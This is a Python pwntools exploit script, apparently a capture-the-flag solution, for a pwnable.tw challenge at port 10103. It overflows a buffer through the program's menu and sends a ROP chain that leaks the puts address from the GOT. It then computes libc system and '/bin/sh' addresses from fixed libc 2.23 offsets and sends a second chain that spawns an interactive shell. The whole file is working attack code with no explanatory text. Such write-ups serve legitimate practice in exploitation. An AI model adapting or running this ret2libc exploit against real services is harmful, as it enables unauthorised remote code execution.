from pwn import *
import time

# Static Addresses
PUTS_PLT = 0x080484a8
MAIN_ADDR = 0x08048954
PUTS_GOT = 0x0804afdc

# Libc 2.23 Offsets
LIBC_SYSTEM_OFFSET = 0x0003a940
LIBC_STR_BINSH_OFFSET = 0x158e8b
LIBC_PUTS_OFFSET = 0x0005f140

# Leaked Libc Addresses
LIBC_BASE = None
LIBC_SYSTEM = None
LIBC_STR_BINSH = None

def recvbuf():

    time.sleep(1)
    return r.recv()

def sendbuf(x):

    r.send(x+"\n")

def crash(payload, stage):

    global LIBC_BASE
    global LIBC_SYSTEM
    global LIBC_STR_BINSH

    print("[+] Sending 46 Byte Offset")
    # Send 46 bytes offset
    recvbuf()
    sendbuf("1")
    recvbuf()
    sendbuf("A"*46)

    print("[+] Sending 2 Byte Offset")
    # Send 2 Bytes offset
    recvbuf()
    sendbuf("2")
    recvbuf()
    sendbuf("AA")

    print("[+] Sending 7 Byte Offset + ROP Chain")
    # Send 7 Bytes offset and ROP chain for mem leak
    recvbuf()
    sendbuf("2")
    recvbuf()
    sendbuf(payload)

    print("[+] Triggering [{}] Overflow".format(stage))
    # Trigger overflow
    recvbuf()
    sendbuf("3")
    time.sleep(2)
    recvbuf()
    sendbuf("3")
    time.sleep(2)
    r.recvuntil("Oh ! You win !!\n")

    if stage == "Leak":

        # Receive leak
        leak = u32(r.recv(4))

        # Calculate offsets using leak
        LIBC_BASE = leak - LIBC_PUTS_OFFSET
        LIBC_SYSTEM = LIBC_BASE + LIBC_SYSTEM_OFFSET
        LIBC_STR_BINSH = LIBC_BASE + LIBC_STR_BINSH_OFFSET

        print("[+] Got __libc_puts leak: " + hex(leak))
        print("[+] Libc Base Address: " + hex(LIBC_BASE))
        print("[+] Libc System Address: " + hex(LIBC_SYSTEM))
        print("[+] Libc /bin/sh String Address: " + hex(LIBC_STR_BINSH))

    elif stage == "Shell":

        print("[+] Shell!")
        r.interactive()
        r.close()

if __name__ == '__main__':

    r = remote("chall.pwnable.tw",10103)

    crash(("C"*7)+(p32(PUTS_PLT))+(p32(MAIN_ADDR))+(p32(PUTS_GOT)),"Leak")
    crash(("C"*7)+(p32(LIBC_SYSTEM))+(p32(0xdeadbabe))+(p32(LIBC_STR_BINSH)),"Shell")

print("[+] Exiting!")
